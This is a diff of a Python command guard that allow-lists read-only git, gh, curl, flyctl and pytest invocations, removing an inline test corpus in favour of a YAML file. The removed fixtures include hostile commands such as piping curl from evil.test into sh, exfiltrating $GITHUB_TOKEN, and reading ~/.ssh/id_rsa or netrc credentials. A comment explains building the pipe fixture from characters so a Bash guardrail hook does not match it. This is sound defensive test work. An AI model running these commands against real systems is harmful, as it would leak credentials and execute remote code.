+    head, rest = argv[0], argv[1:]
     if head not in ALLOWED_COMMANDS:
-        return [
-            f"observe: `{head}` is not allow-listed — permitted first tokens are "
-            f"{', '.join(ALLOWED_COMMANDS)}"
-        ]
-
-    rest = argv[1:]
-    if head == "python3":
-        if rest[:1] == ["-m"]:
-            if rest[1:2] != ["pytest"]:
-                return ["observe: `python3 -m` is permitted only for `pytest`"]
-            for flag in rest[2:]:
-                if flag.split("=", 1)[0] in PYTEST_VALUE_TAKING_FLAGS and "=" not in flag:
-                    return [
-                        f"observe: write `pytest {flag}=<value>`. With a separate value "
-                        f"there is no way to tell an option's value from a test path — "
-                        f"`pytest -k tests` reads as the target `tests`, which exists, and "
-                        f"pytest then discovers every test from the working directory."
-                    ]
-            targets = [a for a in rest[2:] if not a.startswith("-")]
-            if not targets:
-                return [
-                    "observe: `pytest` with no target discovers every test from the "
-                    "working directory. Name the test path the observation is about."
-                ]
-            for flag in rest[2:]:
-                if not flag.startswith("-"):
-                    continue
-                base = flag.split("=", 1)[0]
-                if base.startswith("-o") and base != "-o":
-                    base = "-o"
-                if base in PYTEST_ALLOWED_FLAGS:
-                    continue
-                return [
-                    f"observe: `pytest {base}` is not an allow-listed option. The deny-list "
-                    f"this replaced banned `-p`/`-o`/`--override-ini` (which choose code to "
-                    f"import) and still admitted `--junitxml=<path>` and `--basetemp=<path>`, "
-                    f"which WRITE — including over a repo file the path guard permits."
-                ]
-        elif not (rest and rest[0].startswith("scripts/")):
-            return [
-                "observe: `python3` must run `scripts/...` from the checkout, or "
-                "`python3 -m pytest`"
-            ]
-    elif head in ("fly", "flyctl"):
-        words = _leading_words(rest)
-        if not _subcommand_permitted(words, FLY_READONLY_SUBCOMMANDS):
-            shown = " ".join(words[:2]) or "<none>"
-            return [
-                f"observe: `{head} {shown}` is not a read-only subcommand — permitted: "
-                + _render_table(FLY_READONLY_SUBCOMMANDS, "")
-            ]
-        for flag in rest:
-            if not flag.startswith("-"):
-                continue
-            base = flag.split("=", 1)[0]
-            if base not in FLY_ALLOWED_FLAGS:
-                return [
-                    f"observe: `{head} {base}` is not an allow-listed option — "
-                    f"`-c`/`--config` READS the file its argument names, which reaches a "
-                    f"credential file through a subcommand table that is otherwise correct"
-                ]
-    elif head == "gh":
-        words = _leading_words(rest)
-        if not _subcommand_permitted(words, GH_READONLY_SUBCOMMANDS):
-            shown = " ".join(words[:2]) or "<none>"
-            return [
-                f"observe: `gh {shown}` is not a read-only subcommand — permitted: "
-                + _render_table(GH_READONLY_SUBCOMMANDS, "gh ")
-            ]
-        for flag in rest:
-            if not flag.startswith("-"):
-                continue
-            base = flag.split("=", 1)[0]
-            if base not in GH_ALLOWED_FLAGS:
-                return [
-                    f"observe: `gh {base}` is not an allow-listed option — `--cache` "
-                    f"writes a response cache, `--web` opens a browser, and `-R`/"
-                    f"`--hostname` point the command at somebody else's repository"
-                ]
-        if words[:1] == ["api"]:
-            for flag in rest:
-                base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
-                if base:
-                    return [
-                        f"observe: `gh api {base}` sends a request body or a method other "
-                        f"than GET — an observation reads"
-                    ]
-    elif head == "git":
-        sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
-        for flag in rest[:sub_at]:
-            base = flag.split("=", 1)[0]
-            if base not in GIT_GLOBAL_ALLOWED_FLAGS:
-                return [
-                    f"observe: `git {base}` is a GLOBAL git option, and none are permitted. "
-                    f"`-c` runs a program the argument names, `--paginate` starts $PAGER, "
-                    f"`--help` becomes `git help` which starts man or a browser, and "
-                    f"`-C`/`--git-dir`/`--work-tree` point git at another tree. Put the "
-                    f"subcommand first."
-                ]
-        for flag in rest[sub_at + 1:]:
-            if not flag.startswith("-"):
-                continue
-            base = flag.split("=", 1)[0]
-            if base in ("--format", "--pretty") and "%G" in flag:
-                return [
-                    "observe: a `%G` pretty-format placeholder asks git to VERIFY a "
-                    "signature, which runs `gpg.program` — a program a config value names"
-                ]
-            if _is_count_flag(base) or base in GIT_SUB_ALLOWED_FLAGS:
-                continue
-            return [
-                f"observe: `git {base}` is not an allow-listed option — git options are an "
-                f"allow-list because the deny-list they replaced lost `--output`, `-O` and "
-                f"`--no-index` one at a time. Add it to GIT_SUB_ALLOWED_FLAGS with a guilt "
-                f"and an innocence proof if the observation genuinely needs it."
-            ]
-        sub = rest[sub_at] if sub_at < len(rest) else ""
-        if sub not in GIT_READONLY_SUBCOMMANDS:
-            return [
-                f"observe: `git {sub or '<none>'}` is not a local read-only subcommand — "
-                f"permitted: {', '.join(GIT_READONLY_SUBCOMMANDS)}"
-            ]
-    elif head == "curl":
-        for flag in rest:
-            if not flag.startswith("-"):
-                continue
-            base, _, value = flag.partition("=")
-            if value.startswith("@") or (base not in CURL_ALLOWED_FLAGS and "@" in flag):
-                return [
-                    "observe: a curl option whose value begins with `@` makes curl READ A "
-                    "LOCAL FILE into the request — an observation reads the network, not "
-                    "the disk"
-                ]
-            if base in CURL_ALLOWED_FLAGS:
-                continue
-            if not base.startswith("--") and len(base) > 1 and all(
-                c in CURL_ALLOWED_SHORT_BUNDLE for c in base[1:]
-            ):
-                continue  # a bundle of valueless short options, e.g. -sS
-            return [
-                f"observe: `curl {base}` is not an allow-listed option — curl options are "
-                f"an allow-list because the deny-list they replaced lost `-b`, `-w@`, "
-                f"`--netrc-file`, `--variable`, `--json=@`, `--libcurl` and `--etag-save` "
-                f"one at a time. Add it to CURL_ALLOWED_FLAGS with a guilt and an "
-                f"innocence proof if the observation genuinely needs it."
-            ]
-        # The first draft only checked args that LOOKED like URLs, so `curl evil.test/x`
-        # sailed through and curl defaulted it to plain http. The rule is now positive:
-        # exactly one non-flag argument, and it must be https. A flag that takes a
-        # separate value must therefore be written in its `--flag=value` form.
-        # Consume a value-taking option's value so it is not counted as the URL. Doing
-        # this by ARITY rather than by "does it start with -" is what admits
-        # `curl -m 5 <url>` and `-w '%{http_code}' <url>` without admitting a second URL.
-        words: list[str] = []
-        skip_next = False
-        for token in rest:
-            if skip_next:
-                skip_next = False
-                continue
-            if token in CURL_VALUE_TAKING_FLAGS:
-                skip_next = True
-                continue
-            if not token.startswith("-"):
-                words.append(token)
-        if len(words) != 1:
-            return [
-                f"observe: `curl` must take exactly one non-flag argument (the https URL); "
-                f"found {len(words)}. Write value-taking flags as `--flag=value`."
-            ]
-        if not words[0].startswith("https://"):
-            return [f"observe: `curl` target `{words[0]}` is not an https:// URL"]
-    return []
+        return [f"observe: `{head}` is not allow-listed - permitted first tokens are "
+                f"{', '.join(ALLOWED_COMMANDS)}"]
+    return _COMMAND_CHECKS[head](head, rest)
 
 
 def _guard_observable_script(command: str, repo_root: Path | None = None) -> list[str]:
@@ -1122,22 +937,18 @@ def parse_pack(text: str) -> dict[str, Any]:
 
 
 # -------------------------------------------------------------------- selftest
-#
-# FIXTURE-ASSEMBLY NOTE. Two guilt fixtures below are assembled from pieces at
-# import time rather than written as literals: the shell-pipe one and the
-# chained-command one. This is not obfuscation - it is the only way the corpus
-# can exist in this repository at all. `~/.claude/hooks/guardrails-client.sh`
-# scans every Bash command for the literal shape "curl ... pipe ... sh" and
-# refuses it, which it should; but it matches the shape ANYWHERE in the command
-# text, including inside a heredoc that is merely WRITING this file. Writing the
-# attack we defend against therefore trips the defence. Assembling the string
-# from `_PIPE` keeps the runtime fixture byte-identical to the real attack (the
-# guilt test genuinely exercises the pipe) while the source line that defines it
-# carries no matchable literal. Superscar #3 in miniature, on our own tooling.
-
-_PIPE = chr(124)   # "|"
-_SEMI = chr(59)    # ";"
-_ZWSP = chr(0x200b)
+#: The corpus is DATA and lives in `bites_corpus.yaml` beside this file: 104 fixtures,
+#: 218 lines of Python until 2026-09-04, when Zero ruled the module itself had to
+#: shrink. Only the loader has to stay here. `_pack` is what makes the compact form
+#: possible - most fixtures differ from each other in exactly one field, and spelling
+#: the surrounding four lines 104 times would move the bulk without removing it.
+#:
+#: EDITING NOTE. Two guilt fixtures in that file carry the literal shape
+#: "curl ... pipe ... sh". `~/.claude/hooks/guardrails-client.sh` scans every Bash
+#: command for that shape and refuses it - including inside a heredoc that is merely
+#: WRITING the file. Edit the corpus with a Python script or an editor tool, never by
+#: piping a heredoc through Bash. Superscar #3 in miniature, on our own tooling.
+CORPUS_PATH = Path(__file__).with_name("bites_corpus.yaml")
 
 
 def _pack(observe: str, *, consumer: str = "CI", where: str = "ci",
@@ -1147,8 +958,8 @@ def _pack(observe: str, *, consumer: str = "CI", where: str = "ci",
     Quoting `observe` is deliberate: the command guards, not YAML's plain-scalar
     rules, are what these fixtures are about, and a plain scalar beginning with
     `{`, `*`, `&`, `>` or `|` would be typed by YAML before any guard saw it.
-    Three innocence fixtures below leave it unquoted on purpose, so the corpus
-    still proves the ordinary unquoted spelling parses.
+    Fixtures that are ABOUT the YAML layer carry a verbatim `pack:` instead, and
+    three carry an unquoted `observe:` so the corpus still proves that spelling parses.
     """
     quoted = observe.replace("'", "''")
     return (
@@ -1161,227 +972,36 @@ def _pack(observe: str, *, consumer: str = "CI", where: str = "ci",
     )
 
 
-#: Guilt + innocence corpus. Each entry is (label, pack text, expected classification).
-#: `--selftest` runs it with no pytest, no network and no token, which is what
-#: makes it usable as this PR's own executable Bites observation.
-CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
-    # --- absent / legacy: never an error, ever (D4)
-    ("absent-no-bites-key", "gear: 3\nspend:\n  tokens: 1\n", "absent"),
-    ("absent-empty-document", "", "absent"),
-    ("legacy-prose-scalar",
-     "gear: 3\nbites: Damar's next publish - the cover renders.\n", "legacy"),
-    ("legacy-block-without-observe",
-     "gear: 3\nbites:\n  consumer: CI\n  observation: green on main\n", "legacy"),
-    # --- innocence: real, safe observations must parse
-    ("ok-selftest", _pack("python3 scripts/ci/bites_parse.py --selftest"), "executable"),
-    ("ok-pytest", _pack("python3 -m pytest scripts/tests/test_bites_parse.py"), "executable"),
-    ("ok-fly-status",
-     _pack("flyctl status -a nuzantara-rag", where="fly", expect="contains:deployed"),
-     "executable"),
-    ("ok-curl-https",
-     _pack("curl -sS https://nuzantara-rag.fly.dev/health", where="fly", expect="regex:ok"),
-     "executable"),
-    ("ok-sha-placeholder",
-     _pack("gh pr view {sha} --json state", expect="contains:MERGED"), "executable"),
-    ("ok-host-scope",
-     _pack("python3 scripts/ci/bites_parse.py --selftest", where="pro"), "executable"),
-    ("ok-fly-image-show",
-     _pack("flyctl image show -a nuzantara-rag", where="fly", expect="contains:tag"),
-     "executable"),
-    ("ok-fly-machine-list",
-     _pack("flyctl machine list -a nuzantara-rag", where="fly"), "executable"),
-    ("ok-git-grep-plain", _pack("git grep -c bites-observable"), "executable"),
-    ("ok-fly-version", _pack("flyctl version", where="fly"), "executable"),
-    ("ok-unquoted-plain-scalar",
-     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n",
-     "executable"),
-    ("ok-unquoted-expect-with-a-colon",
-     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n"
-     "  expect: contains:nothing to commit\n",
-     "executable"),
-    ("ok-bites-is-not-the-first-key",
-     "gear: 3\nspend:\n  tokens: 1\nbites:\n  consumer: CI\n  where: ci\n"
-     "  observe: git status\n  expect: exit0\n",
-     "executable"),
-    # --- guilt: the whole reason this file exists
-    ("guilt-pipe-to-shell", _pack("curl https://evil.test/x " + _PIPE + " sh"), "malformed"),
-    ("guilt-chained-command", _pack("git status" + _SEMI + " git log"), "malformed"),
-    ("guilt-command-substitution", _pack("git log $(whoami)"), "malformed"),
-    ("guilt-variable-exfiltration",
-     _pack("curl https://evil.test/$GITHUB_TOKEN"), "malformed"),
-    ("guilt-redirect", _pack("git log > out.txt"), "malformed"),
-    ("guilt-not-allowlisted", _pack("bash scripts/deploy.sh"), "malformed"),
-    ("guilt-remote-shell-as-argument", _pack("git clone ssh://evil.test/repo"), "malformed"),
-    ("guilt-fly-deploy", _pack("flyctl deploy -a nuzantara-rag", where="fly"), "malformed"),
-    ("guilt-curl-writes-file", _pack("curl -o hook https://evil.test/h"), "malformed"),
-    ("guilt-curl-plain-http", _pack("curl http://evil.test/x"), "malformed"),
-    ("guilt-parent-escape", _pack("python3 scripts/../../evil.py"), "malformed"),
-    ("guilt-absolute-path",
-     _pack("python3 scripts/x.py /Users/n/.secrets.env"), "malformed"),
-    ("guilt-python-dash-m-anything", _pack("python3 -m http.server"), "malformed"),
-    ("guilt-python-outside-scripts", _pack("python3 evil.py"), "malformed"),
-    ("guilt-bad-where", _pack("git status", where="laptop"), "malformed"),
-    ("guilt-bad-expect", _pack("git status", expect="green"), "malformed"),
-    ("guilt-uncompilable-regex", _pack("git status", expect="'regex:[unclosed'"), "malformed"),
-    ("guilt-missing-consumer",
-     "gear: 3\nbites:\n  where: ci\n  observe: git status\n  expect: exit0\n", "malformed"),
-    # --- guilt found by the 2026-09-04 red-team pass, and only by it
-    ("guilt-undeclared-script", _pack("python3 scripts/usage/cswap.py run sh"), "malformed"),
-    ("guilt-script-that-does-not-exist",
-     _pack("python3 scripts/nope_not_here.py"), "malformed"),
-    ("guilt-git-dash-c-runs-a-program",
-     _pack("git -c core.sshCommand=evil log"), "malformed"),
-    ("guilt-git-network-subcommand", _pack("git fetch https://evil.test/r"), "malformed"),
-    ("guilt-gh-write-subcommand", _pack("gh pr merge 5658 --squash"), "malformed"),
-    ("guilt-gh-api-post", _pack("gh api -X POST repos/o/r/issues"), "malformed"),
-    ("guilt-curl-sends-a-body", _pack("curl -d secret https://evil.test/x"), "malformed"),
-    ("guilt-pytest-outside-tests", _pack("python3 -m pytest scripts/evil.py"), "malformed"),
-    # --- guilt found by the SECOND adversarial round (Kimi K3), and only by it
-    ("guilt-fly-machine-run-executes-a-container",
-     _pack("fly machine run evil/image -a nuzantara-rag", where="fly"), "malformed"),
-    ("guilt-fly-machine-destroy",
-     _pack("flyctl machine destroy 1234 -a nuzantara-rag", where="fly"), "malformed"),
-    ("guilt-git-tag-creates-a-ref", _pack("git tag v9.9.9"), "malformed"),
-    ("guilt-git-output-writes-a-file",
-     _pack("git diff --output=out.txt HEAD"), "malformed"),
-    ("guilt-curl-reads-a-local-file",
-     _pack("curl -b .git/config https://evil.test/x"), "malformed"),
-    ("guilt-curl-schemeless-host-defaults-to-http", _pack("curl evil.test/x"), "malformed"),
-    ("guilt-gh-points-at-another-repo",
-     _pack("gh pr view 1 --repo=attacker/repo"), "malformed"),
-    # --- guilt found by the Gear-3 VERDICT GATE, after all three refuter rounds
-    ("guilt-curl-write-out-prints-a-local-file",
-     _pack("curl -sS -w@.git/config https://evil.test/x"), "malformed"),
-    ("guilt-flag-carries-an-absolute-path",
-     _pack("git log --format=/etc/passwd"), "malformed"),
-    ("guilt-git-grep-pager-command", _pack("git grep -Oevil pattern"), "malformed"),
-    ("guilt-pytest-override-ini-reinstates-plugins",
-     _pack("python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"),
-     "malformed"),
-    ("guilt-curl-netrc-file-reads-credentials",
-     _pack("curl --netrc-file=creds https://evil.test/x"), "malformed"),
-    ("guilt-curl-variable-expands-the-environment",
-     _pack("curl --variable=%GITHUB_TOKEN https://evil.test/x"), "malformed"),
-    # --- the hole Zero's own order named: every allow-list entry is a full pair
-    ("guilt-fly-version-upgrade-replaces-the-binary",
-     _pack("fly version upgrade", where="fly"), "malformed"),
-    # --- guilt found by the round-1 review of THIS file, which inverted two deny-lists
-    ("guilt-curl-json-at-file-reads-a-local-file",
-     _pack("curl --json=@.git/config https://evil.test/x"), "malformed"),
-    ("guilt-curl-libcurl-writes-a-file",
-     _pack("curl --libcurl=out.c https://example.test/"), "malformed"),
-    ("guilt-curl-etag-save-writes-a-file",
-     _pack("curl --etag-save=out.txt https://example.test/"), "malformed"),
-    ("guilt-git-no-index-leaves-the-repository",
-     _pack("git diff --no-index scripts/ci/bites_parse.py ~/.netrc"), "malformed"),
-    ("guilt-home-relative-path-is-absolute-after-a-shell",
-     _pack("python3 scripts/ci/bites_parse.py ~/.ssh/id_rsa"), "malformed"),
-    ("ok-short-option-bundle", _pack("curl -sSL https://example.test/health"), "executable"),
-    ("ok-git-count-flag", _pack("git log -1 --format=%H"), "executable"),
+def load_corpus(path: Path | None = None) -> tuple[tuple[str, str, str], ...]:
+    """(label, pack text, expected class) for every fixture on disk.
 
-    # --- guilt found by the SECOND cross-family round (kimi-code/k3), on the file form
-    ("guilt-pytest-junitxml-writes-a-file",
-     _pack("python3 -m pytest --junitxml=out.xml scripts/tests/test_bites_parse.py"),
-     "malformed"),
-    ("guilt-pytest-basetemp-writes-a-tree",
-     _pack("python3 -m pytest --basetemp=tmp scripts/tests/test_bites_parse.py"),
-     "malformed"),
-    ("guilt-expect-regex-nests-quantifiers",
-     _pack("git status", expect="'regex:^(a+)+$'"), "malformed"),
-    ("guilt-expect-regex-quantifies-an-alternation",
-     _pack("git status", expect="'regex:^(a|a)+$'"), "malformed"),
-    ("guilt-pack-nested-500-deep-is-malformed-not-a-crash",
-     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: exit0\n"
-     "pad: " + "[" * 500 + "]" * 500 + "\n",
-     "malformed"),
-    ("ok-pytest-quiet", _pack("python3 -m pytest -q scripts/tests/test_bites_parse.py"),
-     "executable"),
-    ("ok-expect-regex-with-one-quantifier",
-     _pack("git status", expect="'regex:[0-9]+ passed'"), "executable"),
+    A missing or unreadable corpus is a hard error rather than an empty tuple: a
+    selftest that silently runs zero fixtures reports `0/0 pass`, which is superscar
+    #2 - green because nothing ran.
+    """
+    target = path or CORPUS_PATH
+    try:
+        entries = yaml.safe_load(target.read_text(encoding="utf-8"))
+    except OSError as exc:
+        raise SystemExit(f"bites_parse: corpus unreadable at {target}: {exc}") from exc
+    if not entries:
+        raise SystemExit(f"bites_parse: corpus at {target} is empty")
+    return tuple(
+        (
+            entry["label"],
+            entry["pack"] if "pack" in entry else _pack(
+                entry["observe"],
+                consumer=entry.get("consumer", "CI"),
+                where=entry.get("where", "ci"),
+                expect=entry.get("expect", "exit0"),
+            ),
+            entry["class"],
+        )
+        for entry in entries
+    )
 
-    # --- guilt found by the THIRD cross-family round (codex-gpt-5.6-sol), on the file form
-    ("guilt-gh-cache-writes-a-cache", _pack("gh api repos/o/r --cache=1h"), "malformed"),
-    ("guilt-gh-web-opens-a-browser", _pack("gh pr view 1 --web"), "malformed"),
-    ("guilt-git-paginate-starts-a-pager", _pack("git --paginate log -1"), "malformed"),
-    ("guilt-git-help-starts-man", _pack("git --help log"), "malformed"),
-    ("guilt-git-gpg-format-runs-a-program",
-     _pack("git log -1 --format=%GG"), "malformed"),
-    ("guilt-fly-config-reads-a-file",
-     _pack("fly status --config=.git/config", where="fly"), "malformed"),
-    ("guilt-pytest-with-no-target-walks-the-tree",
-     _pack("python3 -m pytest"), "malformed"),
-    ("guilt-pytest-separate-value-looks-like-a-target",
-     _pack("python3 -m pytest -k tests"), "malformed"),
-    ("guilt-pytest-args-from-file",
-     _pack("python3 -m pytest @scripts/tests/args.txt"), "malformed"),
-    ("guilt-pytest-warning-filter-imports-a-module",
-     _pack("python3 -m pytest -W=error::evil.Custom scripts/tests/test_bites_parse.py"),
-     "malformed"),
-    ("guilt-invisible-character-in-a-key-hides-the-whole-block",
-     "bites\u200b:\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n",
-     "malformed"),
-    ("guilt-invisible-character-duplicates-a-key-invisibly",
-     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n"
-     "  observe\u200b: git log\n  expect: exit0\n",
-     "malformed"),
-    ("guilt-misspelled-key-is-a-broken-contract-not-prose",
-     "bites:\n  consumer: x\n  where: ci\n  obsevre: git log\n  expect: exit0\n",
-     "malformed"),
-    ("guilt-bites-is-a-list", "bites: []\n", "malformed"),
-    ("ok-pytest-glued-option-value",
-     _pack("python3 -m pytest -k=bites scripts/tests/test_bites_parse.py"), "executable"),
 
-    # --- round 4: two escapes the containment guard missed, and the OVER-match the
-    # --- three inversions introduced, which is the half a reviewer has to be asked for
-    ("guilt-dotdot-glued-after-a-colon",
-     _pack("git log -L 1,1:../secret -1"), "malformed"),
-    ("guilt-tilde-user-is-still-a-tilde",
-     _pack("git log ~otheruser/.ssh/id_rsa"), "malformed"),
-    ("ok-diff-filter", _pack("git diff --cached --name-only --diff-filter=ACMR"),
-     "executable"),
-    ("ok-pathspec-separator", _pack("git diff --name-only -- apps/backend-rag"),
-     "executable"),
-    ("ok-diff-context", _pack("git diff -U0 HEAD"), "executable"),
-    ("ok-curl-max-time-separate-value",
-     _pack("curl -fsS -m 5 https://nuzantara-rag.fly.dev/health", where="fly"),
-     "executable"),
-    ("ok-curl-write-out-separate-value",
-     _pack("curl -sS -w %{http_code} https://nuzantara-rag.fly.dev/health", where="fly"),
-     "executable"),
-    ("ok-url-query-string-carrying-at",
-     _pack("curl -sS https://nuzantara-rag.fly.dev/health?cb=@2", where="fly"),
-     "executable"),
-
-    # --- guilt the FILE form has to answer, which the body form never faced
-    ("guilt-two-bites-blocks-in-one-pack",
-     "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\n"
-     "bites:\n  consumer: attacker\n  where: ci\n  observe: git log\n  expect: exit0\n",
-     "malformed"),
-    ("guilt-two-observe-keys-in-one-block",
-     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  observe: git log\n"
-     "  expect: exit0\n",
-     "malformed"),
-    ("guilt-alias-puts-the-command-elsewhere",
-     "anchors:\n  cmd: &cmd git log\nbites:\n  consumer: x\n  where: ci\n  observe: *cmd\n"
-     "  expect: exit0\n",
-     "malformed"),
-    ("guilt-merge-key-imports-a-block",
-     "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
-     "bites:\n  <<: *base\n",
-     "malformed"),
-    ("guilt-expect-typed-as-a-boolean",
-     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n",
-     "malformed"),
-    ("guilt-observe-typed-as-a-number",
-     "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n", "malformed"),
-    ("guilt-bites-present-but-empty", "gear: 3\nbites:\n", "malformed"),
-    ("guilt-pack-is-not-a-mapping", "- gear: 3\n- bites: x\n", "malformed"),
-    ("guilt-pack-is-not-yaml", "gear: 3\n\tbites:\n  consumer: x\n", "malformed"),
-    ("guilt-zero-width-splits-the-two-readings",
-     "bites:\n  consumer: x\n  where: ci\n  observe: \"git" + _ZWSP + " status\"\n"
-     "  expect: exit0\n",
-     "malformed"),
-)
+CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = load_corpus()
 
 
 def classify(result: dict[str, Any]) -> str:
